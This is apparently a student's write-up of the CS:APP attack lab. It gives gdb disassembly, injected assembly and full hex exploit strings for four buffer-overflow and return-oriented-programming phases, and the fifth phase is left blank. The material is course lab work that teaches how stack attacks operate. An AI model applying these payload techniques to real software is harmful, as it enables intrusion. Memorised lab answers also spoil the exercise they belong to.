# The attack lab 

## The attack 1

This one is simply a code injection, it will use t

he function `getbuf`
```nasm
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	ret
End of assembler dump.
```
So it will allcate a space of 32+8 = 40 bytes space. It more than 40 bytes is 
given, it will get more space from the stack .
So we need to attach the address of the function touch1 to the injection data.

```nasm
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	call   0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	call   0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	call   0x400e40 <exit@plt>
End of assembler dump.
```

So the final input is 
```c
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```
For the reason of little endian storage. So it is like this. 

## The attack 2
In this problem, we need to inject the data which contianis the cookie. 

Disassemble the function touch2, we can get the code below.

```nasm
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	call   0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	call   0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	call   0x400e40 <exit@plt>
End of assembler dump.
```
The touch2's parameter is `val`, this val is storaged in the `rdi`, so our target 
is to set the `rdi` to be `cookie`

In this way, we can do like this 

使用汇编生成一段攻击的代码，将rdi的值设置为cookie，同时将touch2的地址push到我们的栈
中去。

```nasm
pushq $0x4017ec # The address of the touch2 
mov $0x59b997fa, %rdi 
ret
```

```nasm
> gcc -c hack.s
> ls
ans11.txt  ans21.txt  attacklab.pdf  ctarget  farm.c  hack.s   note.md     rtarget
ans1.txt   ans2.txt   cookie.txt     ctar.s   hack.o  hex2raw  README.txt
> objdump -d hack.o

hack.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```

> When you gdb the ctarget, you should `set args -q -i [file]` 
> Then  `b getbuf` , you can get the top of the stack 

```nasm
(gdb) disas
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	ret
End of assembler dump.
(gdb) info r rsp
rsp            0x5561dc78          0x5561dc78
```
So the attack string should be
```c
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
78 dc 61 55
```

In the code, it will return to the top of the stack. Then it will 
execute the hack code. The `edi` will be like the cookie,and it will be push 
into the stack.

# The attack 3

In the attack 3, it use the function hexmatch, so the stack will be changed. 
If you storage the data of the cookie in the stack place allcated by the getbuf
will be changed, so we need to palce the cookie into the older place. 
The hack code should be like this.
```nasm
pushq $0x4018fa
movq $0x5561dca8,%rdi
ret
```
After objdump it. we can get its machine instructions. 
```c
68 fa 18 40 00 48 c7 c7
a8 dc 61 55 c3 00 00 00 <<== machine code 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 <<== The top of the stack 
35 39 62 39 39 37 66 61 <<== The string 
```

# The attack 4

For the attack 4, it is different from the previous attacks, you can not use the 
code injection directly in the phase2 because
- the stack is random. You won't know where your code is put. 
- The code in the stack is unexecuteable, you can only jump to a certain code. 

So you will need to using the command and the reg to achieve it. 

So the command we need will be the 
```nasm
push cookie (1)
popq %rax   (2)
movq %rax, %rdi (3)
```
The cookie should be put in the old place than the (2)
Then we should make the (3) and the address of the `touch2` at the older place of 
the stack. 

```nasm
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00 <<== (1)
fa 97 b9 59 00 00 00 00 <<== cookie
c5 19 40 00 00 00 00 00 <<== (3)
ec 17 40 00 00 00 00 00 <<== address of the touch2 
```

# The attack 5




